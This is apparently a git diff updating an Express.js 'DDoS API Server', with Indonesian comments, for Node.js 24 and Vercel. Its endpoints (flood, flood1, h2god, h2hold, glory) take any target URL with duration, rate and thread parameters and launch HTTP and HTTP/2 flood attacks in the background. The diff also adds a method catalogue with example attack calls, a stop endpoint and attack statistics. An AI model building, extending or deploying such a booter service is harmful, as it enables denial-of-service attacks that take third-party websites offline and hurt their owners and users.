@@ -1,30 +1,51 @@
 const express = require('express');
 const cors = require('cors');
-const bodyParser = require('body-parser');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
 const fs = require('fs');
 
+// Fix untuk Node.js 24 - bodyParser sudah built-in di Express
 const app = express();
 
-// Middleware
+// Middleware untuk Node.js 24
 app.use(cors());
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+
+// Security headers
+app.use((req, res, next) => {
+  res.setHeader('X-Powered-By', 'DDoS API Server');
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'DENY');
+  next();
+});
 
 // Serve static files
-app.use(express.static(path.join(__dirname, '../public')));
+app.use(express.static(path.join(__dirname, '../public'), {
+  maxAge: '1h',
+  etag: true
+}));
 
 // Import AttackManager
 const AttackManager = require('../lib/attackManager');
 const attackManager = new AttackManager();
 
-// Rate limiting
+// Rate limiting yang compatible dengan Node.js 24
 const rateLimit = require('express-rate-limit');
 const limiter = rateLimit({
-  windowMs: 5 * 60 * 1000,
-  max: 10,
-  message: { success: false, error: 'Too many requests, please try again later' }
+  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 300000,
+  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 10,
+  standardHeaders: 'draft-7',
+  legacyHeaders: false,
+  skip: (req) => req.path === '/api/status' || req.path === '/api/stats',
+  message: {
+    success: false,
+    error: 'Too many requests, please try again later',
+    retryAfter: 300
+  },
+  handler: (req, res, next, options) => {
+    res.status(429).json(options.message);
+  }
 });
 
 // Home page
@@ -32,66 +53,106 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, '../public/index.html'));
 });
 
-// API Routes
+// API Routes - FIXED untuk Node.js 24
 app.get('/api/flood', limiter, async (req, res) => {
-  const { target, duration } = req.query;
-  
-  if (!target || !duration) {
-    return res.status(400).json({
-      success: false,
-      error: 'Parameter target dan duration diperlukan'
-    });
-  }
-
-  if (!attackManager.canStartAttack()) {
-    return res.status(429).json({
-      success: false,
-      error: 'Server is busy, please try again later'
-    });
-  }
-
   try {
-    const attackId = uuidv4();
-    await attackManager.executeAttack('flood', attackId, [target, duration], parseInt(duration) * 1000 + 5000);
+    const { target, duration } = req.query;
     
+    // Validation
+    if (!target || !duration) {
+      return res.status(400).json({
+        success: false,
+        error: 'Parameter target dan duration diperlukan'
+      });
+    }
+
+    // URL validation
+    try {
+      new URL(target);
+    } catch {
+      return res.status(400).json({
+        success: false,
+        error: 'URL target tidak valid'
+      });
+    }
+
+    if (!attackManager.canStartAttack()) {
+      return res.status(429).json({
+        success: false,
+        error: 'Server is busy, please try again later',
+        queuePosition: attackManager.getQueueLength()
+      });
+    }
+
+    const attackId = uuidv4();
+    
+    // Start attack in background
+    setTimeout(async () => {
+      try {
+        await attackManager.executeAttack('flood', attackId, [target, duration], 
+          parseInt(duration) * 1000 + 5000);
+      } catch (error) {
+        console.error(`Attack ${attackId} failed:`, error.message);
+      }
+    }, 0);
+
     res.json({
       success: true,
       method: 'flood',
       target: target,
       duration: duration,
       attackId: attackId,
-      message: 'Attack launched successfully'
+      message: 'Attack launched successfully',
+      estimatedTime: `${duration} seconds`
     });
   } catch (error) {
+    console.error('Flood attack error:', error);
     res.status(500).json({
       success: false,
-      error: error.message,
-      method: 'flood'
+      error: 'Internal server error',
+      message: error.message
     });
   }
 });
 
 app.get('/api/flood1', limiter, async (req, res) => {
-  const { target, duration } = req.query;
-  
-  if (!target || !duration) {
-    return res.status(400).json({
-      success: false,
-      error: 'Parameter target dan duration diperlukan'
-    });
-  }
-
-  if (!attackManager.canStartAttack()) {
-    return res.status(429).json({
-      success: false,
-      error: 'Server is busy, please try again later'
-    });
-  }
-
   try {
-    const attackId = uuidv4();
-    await attackManager.executeAttack('flood1', attackId, [target, duration], parseInt(duration) * 1000 + 5000);
+    const { target, duration } = req.query;
     
+    if (!target || !duration) {
+      return res.status(400).json({
+        success: false,
+        error: 'Parameter target dan duration diperlukan'
+      });
+    }
+
+    try {
+      new URL(target);
+    } catch {
+      return res.status(400).json({
+        success: false,
+        error: 'URL target tidak valid'
+      });
+    }
+
+    if (!attackManager.canStartAttack()) {
+      return res.status(429).json({
+        success: false,
+        error: 'Server is busy, please try again later'
+      });
+    }
+
+    const attackId = uuidv4();
+    
+    setTimeout(async () => {
+      try {
+        await attackManager.executeAttack('flood1', attackId, [target, duration], 
+          parseInt(duration) * 1000 + 5000);
+      } catch (error) {
+        console.error(`Attack ${attackId} failed:`, error.message);
+      }
+    }, 0);
+
     res.json({
       success: true,
       method: 'flood1',
@@ -101,36 +162,53 @@ app.get('/api/flood1', limiter, async (req, res) => {
       message: 'Attack launched successfully'
     });
   } catch (error) {
+    console.error('Flood1 attack error:', error);
     res.status(500).json({
       success: false,
-      error: error.message,
-      method: 'flood1'
+      error: 'Internal server error'
     });
   }
 });
 
 app.get('/api/h2god', limiter, async (req, res) => {
-  const { target, time, rate, threads } = req.query;
-  
-  if (!target || !time || !rate || !threads) {
-    return res.status(400).json({
-      success: false,
-      error: 'Parameter target, time, rate, dan threads diperlukan'
-    });
-  }
-
-  if (!attackManager.canStartAttack()) {
-    return res.status(429).json({
-      success: false,
-      error: 'Server is busy, please try again later'
-    });
-  }
-
   try {
+    const { target, time, rate, threads } = req.query;
+    
+    if (!target || !time || !rate || !threads) {
+      return res.status(400).json({
+        success: false,
+        error: 'Parameter target, time, rate, dan threads diperlukan'
+      });
+    }
+
+    try {
+      new URL(target);
+    } catch {
+      return res.status(400).json({
+        success: false,
+        error: 'URL target tidak valid'
+      });
+    }
+
+    if (!attackManager.canStartAttack()) {
+      return res.status(429).json({
+        success: false,
+        error: 'Server is busy, please try again later'
+      });
+    }
+
     const attackId = uuidv4();
     const params = [target, time, rate, threads];
-    await attackManager.executeAttack('h2god', attackId, params, parseInt(time) * 1000 + 5000);
     
+    setTimeout(async () => {
+      try {
+        await attackManager.executeAttack('h2god', attackId, params, 
+          parseInt(time) * 1000 + 5000);
+      } catch (error) {
+        console.error(`Attack ${attackId} failed:`, error.message);
+      }
+    }, 0);
+
     res.json({
       success: true,
       method: 'h2god',
@@ -142,36 +220,53 @@ app.get('/api/h2god', limiter, async (req, res) => {
       message: 'Attack launched successfully'
     });
   } catch (error) {
+    console.error('H2God attack error:', error);
     res.status(500).json({
       success: false,
-      error: error.message,
-      method: 'h2god'
+      error: 'Internal server error'
     });
   }
 });
 
 app.get('/api/h2hold', limiter, async (req, res) => {
-  const { target, time, rate, threads } = req.query;
-  
-  if (!target || !time || !rate || !threads) {
-    return res.status(400).json({
-      success: false,
-      error: 'Parameter target, time, rate, dan threads diperlukan'
-    });
-  }
-
-  if (!attackManager.canStartAttack()) {
-    return res.status(429).json({
-      success: false,
-      error: 'Server is busy, please try again later'
-    });
-  }
-
   try {
+    const { target, time, rate, threads } = req.query;
+    
+    if (!target || !time || !rate || !threads) {
+      return res.status(400).json({
+        success: false,
+        error: 'Parameter target, time, rate, dan threads diperlukan'
+      });
+    }
+
+    try {
+      new URL(target);
+    } catch {
+      return res.status(400).json({
+        success: false,
+        error: 'URL target tidak valid'
+      });
+    }
+
+    if (!attackManager.canStartAttack()) {
+      return res.status(429).json({
+        success: false,
+        error: 'Server is busy, please try again later'
+      });
+    }
+
     const attackId = uuidv4();
     const params = [target, time, rate, threads];
-    await attackManager.executeAttack('h2-hold', attackId, params, parseInt(time) * 1000 + 5000);
     
+    setTimeout(async () => {
+      try {
+        await attackManager.executeAttack('h2-hold', attackId, params, 
+          parseInt(time) * 1000 + 5000);
+      } catch (error) {
+        console.error(`Attack ${attackId} failed:`, error.message);
+      }
+    }, 0);
+
     res.json({
       success: true,
       method: 'h2hold',
@@ -183,36 +278,53 @@ app.get('/api/h2hold', limiter, async (req, res) => {
       message: 'Attack launched successfully'
     });
   } catch (error) {
+    console.error('H2Hold attack error:', error);
     res.status(500).json({
       success: false,
-      error: error.message,
-      method: 'h2hold'
+      error: 'Internal server error'
     });
   }
 });
 
 app.get('/api/glory', limiter, async (req, res) => {
-  const { target, time, rate, threads } = req.query;
-  
-  if (!target || !time || !rate || !threads) {
-    return res.status(400).json({
-      success: false,
-      error: 'Parameter target, time, rate, dan threads diperlukan'
-    });
-  }
-
-  if (!attackManager.canStartAttack()) {
-    return res.status(429).json({
-      success: false,
-      error: 'Server is busy, please try again later'
-    });
-  }
-
   try {
+    const { target, time, rate, threads } = req.query;
+    
+    if (!target || !time || !rate || !threads) {
+      return res.status(400).json({
+        success: false,
+        error: 'Parameter target, time, rate, dan threads diperlukan'
+      });
+    }
+
+    try {
+      new URL(target);
+    } catch {
+      return res.status(400).json({
+        success: false,
+        error: 'URL target tidak valid'
+      });
+    }
+
+    if (!attackManager.canStartAttack()) {
+      return res.status(429).json({
+        success: false,
+        error: 'Server is busy, please try again later'
+      });
+    }
+
     const attackId = uuidv4();
     const params = [target, time, rate, threads];
-    await attackManager.executeAttack('glory', attackId, params, parseInt(time) * 1000 + 5000);
     
+    setTimeout(async () => {
+      try {
+        await attackManager.executeAttack('glory', attackId, params, 
+          parseInt(time) * 1000 + 5000);
+      } catch (error) {
+        console.error(`Attack ${attackId} failed:`, error.message);
+      }
+    }, 0);
+
     res.json({
       success: true,
       method: 'glory',
@@ -224,10 +336,10 @@ app.get('/api/glory', limiter, async (req, res) => {
       message: 'Attack launched successfully'
     });
   } catch (error) {
+    console.error('Glory attack error:', error);
     res.status(500).json({
       success: false,
-      error: error.message,
-      method: 'glory'
+      error: 'Internal server error'
     });
   }
 });
@@ -236,102 +348,145 @@ app.get('/api/methods', (req, res) => {
   const methods = [
     {
       name: 'flood',
-      description: 'Metode Flood dasar',
+      description: 'Metode Flood dasar menggunakan HTTP/1.1',
       parameters: ['target', 'duration'],
-      endpoint: '/api/flood'
+      endpoint: '/api/flood',
+      example: '/api/flood?target=https://example.com&duration=60'
     },
     {
       name: 'flood1',
-      description: 'Metode Flood tingkat tinggi',
+      description: 'Metode Flood tingkat tinggi dengan multi-threading',
       parameters: ['target', 'duration'],
-      endpoint: '/api/flood1'
+      endpoint: '/api/flood1',
+      example: '/api/flood1?target=https://example.com&duration=60'
     },
     {
       name: 'h2god',
-      description: 'Metode HTTP/2 God',
+      description: 'Metode HTTP/2 God dengan multiplexing',
       parameters: ['target', 'time', 'rate', 'threads'],
-      endpoint: '/api/h2god'
+      endpoint: '/api/h2god',
+      example: '/api/h2god?target=https://example.com&time=60&rate=100&threads=10'
     },
     {
       name: 'h2hold',
-      description: 'Metode HTTP/2 Hold',
+      description: 'Metode HTTP/2 Hold dengan connection persistence',
       parameters: ['target', 'time', 'rate', 'threads'],
-      endpoint: '/api/h2hold'
+      endpoint: '/api/h2hold',
+      example: '/api/h2hold?target=https://example.com&time=60&rate=100&threads=10'
     },
     {
       name: 'glory',
-      description: 'Metode Glory',
+      description: 'Metode Glory dengan advanced techniques',
       parameters: ['target', 'time', 'rate', 'threads'],
-      endpoint: '/api/glory'
+      endpoint: '/api/glory',
+      example: '/api/glory?target=https://example.com&time=60&rate=100&threads=10'
     }
   ];
   
   res.json({
     success: true,
-    methods: methods,
-    stats: {
+    timestamp: new Date().toISOString(),
+    server: {
+      nodeVersion: process.version,
+      maxConcurrent: attackManager.maxConcurrent,
       activeAttacks: attackManager.getActiveCount(),
-      maxConcurrent: attackManager.maxConcurrent
+      available: attackManager.canStartAttack()
+    },
+    methods: methods,
+    limits: {
+      rateLimit: process.env.RATE_LIMIT_MAX_REQUESTS || 10,
+      window: '5 minutes',
+      maxDuration: '300 seconds'
     }
   });
 });
 
 app.get('/api/status', (req, res) => {
   const scriptNames = ['flood', 'flood1', 'h2god', 'h2-hold', 'glory'];
-  const scriptData = scriptNames.map(name => {
-    const exists = fs.existsSync(path.join(__dirname, '../lib/scripts', `${name}.js`));
-    return { name, exists };
+  const scriptData = [];
+  
+  scriptNames.forEach(name => {
+    const scriptPath = path.join(__dirname, '../lib/scripts', `${name}.js`);
+    const exists = fs.existsSync(scriptPath);
+    
+    scriptData.push({
+      name: name,
+      exists: exists,
+      ready: exists ? 'Yes' : 'No'
+    });
   });
   
-  const proxyExists = fs.existsSync(path.join(__dirname, '../assets/proxy.txt'));
-  const uaExists = fs.existsSync(path.join(__dirname, '../assets/ua.txt'));
+  const activeAttacks = attackManager.getAllAttacks();
   
   res.json({
     success: true,
+    timestamp: new Date().toISOString(),
     server: {
       status: 'running',
-      uptime: process.uptime(),
-      memory: process.memoryUsage(),
-      activeAttacks: attackManager.getActiveCount(),
-      maxConcurrent: attackManager.maxConcurrent
+      nodeVersion: process.version,
+      uptime: Math.floor(process.uptime()),
+      memory: {
+        used: Math.round(process.memoryUsage().heapUsed / 1024 / 1024),
+        total: Math.round(process.memoryUsage().heapTotal / 1024 / 1024)
+      }
     },
-    files: {
-      scripts: scriptData,
-      proxy: { exists: proxyExists, path: proxyExists ? '/assets/proxy.txt' : null },
-      userAgents: { exists: uaExists, path: uaExists ? '/assets/ua.txt' : null }
-    }
+    attacks: {
+      active: attackManager.getActiveCount(),
+      max: attackManager.maxConcurrent,
+      available: attackManager.canStartAttack(),
+      list: activeAttacks
+    },
+    scripts: scriptData
   });
 });
 
 app.get('/api/stats', (req, res) => {
+  const stats = attackManager.getStats();
+  const memoryUsage = process.memoryUsage();
+  
   res.json({
     success: true,
-    stats: {
-      activeAttacks: attackManager.getActiveCount(),
-      maxConcurrent: attackManager.maxConcurrent,
-      available: attackManager.canStartAttack(),
-      memory: process.memoryUsage(),
-      uptime: process.uptime()
+    timestamp: new Date().toISOString(),
+    attackStats: stats,
+    system: {
+      memory: {
+        rss: Math.round(memoryUsage.rss / 1024 / 1024),
+        heapUsed: Math.round(memoryUsage.heapUsed / 1024 / 1024),
+        heapTotal: Math.round(memoryUsage.heapTotal / 1024 / 1024),
+        external: Math.round(memoryUsage.external / 1024 / 1024)
+      },
+      uptime: Math.floor(process.uptime()),
+      node: process.version,
+      platform: process.platform
     }
   });
 });
 
 app.post('/api/stop', (req, res) => {
-  const { attackId } = req.body;
-  
-  if (!attackId) {
-    return res.status(400).json({
+  try {
+    const { attackId } = req.body;
+    
+    if (!attackId) {
+      return res.status(400).json({
+        success: false,
+        error: 'attackId diperlukan'
+      });
+    }
+    
+    const stopped = attackManager.removeAttack(attackId);
+    
+    res.json({
+      success: stopped,
+      message: stopped ? `Attack ${attackId} berhasil dihentikan` : `Attack ${attackId} tidak ditemukan`,
+      attackId: attackId
+    });
+  } catch (error) {
+    console.error('Stop attack error:', error);
+    res.status(500).json({
       success: false,
-      error: 'attackId diperlukan'
+      error: 'Internal server error'
     });
   }
-  
-  const stopped = attackManager.removeAttack(attackId);
-  
-  res.json({
-    success: stopped,
-    message: stopped ? `Attack ${attackId} stopped` : `Attack ${attackId} not found`
-  });
 });
 
 // Serve assets
@@ -344,13 +499,21 @@ app.get('/assets/:file', (req, res) => {
   }
 });
 
-// Error handling
+// Error handling untuk Node.js 24
 app.use((err, req, res, next) => {
-  console.error('Server Error:', err.stack);
+  console.error('Server Error:', {
+    message: err.message,
+    stack: err.stack,
+    url: req.url,
+    method: req.method,
+    timestamp: new Date().toISOString()
+  });
+  
   res.status(500).json({
     success: false,
     error: 'Internal Server Error',
-    message: err.message
+    timestamp: new Date().toISOString(),
+    requestId: req.id || uuidv4()
   });
 });
 
@@ -358,8 +521,21 @@ app.use((err, req, res, next) => {
 app.use((req, res) => {
   res.status(404).json({
     success: false,
-    error: 'Endpoint tidak ditemukan'
+    error: 'Endpoint tidak ditemukan',
+    path: req.path,
+    timestamp: new Date().toISOString()
   });
 });
 
+// Health check untuk Vercel
+app.get('/health', (req, res) => {
+  res.status(200).json({
+    status: 'healthy',
+    timestamp: new Date().toISOString(),
+    uptime: process.uptime(),
+    memory: process.memoryUsage()
+  });
+});
+
+// Export untuk Vercel
 module.exports = app;
